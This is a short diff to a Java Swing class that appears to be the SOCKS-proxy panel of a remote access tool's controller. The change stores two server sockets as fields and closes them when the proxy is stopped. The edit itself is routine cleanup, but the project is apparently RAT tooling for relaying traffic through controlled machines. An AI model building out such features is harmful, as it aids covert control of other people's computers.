@@ -41,6 +41,8 @@ public class FrameSocks extends JFrame {
 	private JButton btnStop;
 	private JButton btnStart;
 	private JSpinner spinner_1;
+	private ServerSocket socksServer;
+	private ServerSocket incomingSocksConnection;
 
 	public FrameSocks(RATObject ratobj) {
 		this.ratobj = ratobj;
@@ -219,8 +221,8 @@ public class FrameSocks extends JFrame {
 				new Thread(new Runnable() {
 					public void run() {
 						try {
-							ServerSocket socksServer = new ServerSocket(port);
-							ServerSocket incomingSocksConnection = new ServerSocket(incomingPort);
+							socksServer = new ServerSocket(port);
+							incomingSocksConnection = new ServerSocket(incomingPort);
 
 							while (btnStop.isEnabled()) {
 								Socket s = socksServer.accept();
@@ -247,6 +249,9 @@ public class FrameSocks extends JFrame {
 			} else {
 				Packet119Stop packet = new Packet119Stop(ratobj);
 				ratobj.addToSendQueue(packet);
+				
+				socksServer.close();
+				incomingSocksConnection.close();
 			}
 						
 		} catch (Exception ex) {
